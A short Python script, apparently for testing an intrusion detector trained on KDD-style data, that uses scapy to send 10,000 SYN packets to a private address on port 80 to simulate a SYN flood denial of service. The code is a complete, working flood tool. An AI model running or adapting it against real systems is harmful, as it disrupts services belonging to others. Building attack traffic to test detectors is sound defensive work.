"""
simulate_attack.py
Simulates a volumetric SYN Flood (Neptune DoS).
"""
from scapy.all import IP, TCP, send
import random

TARGET_IP = "192.168.0.1"

def simulate_dos():
    print(f"\n[+] Launching MASSIVE DoS SYN Flood against {TARGET_IP}...")
    print("[+] Flooding sliding window to hit KDD 511-packet ceiling...")
    
    # Cranked up to 10,000 to bury the ramp-up logs with max-confidence logs
    for _ in range(10000):
        sport = random.randint(1024, 65535)
        send(IP(dst=TARGET_IP) / TCP(sport=sport, dport=80, flags="S", seq=random.randint(1000, 9000)), verbose=False)
        
    print("[+] Attack complete.")

if __name__ == "__main__":
    simulate_dos()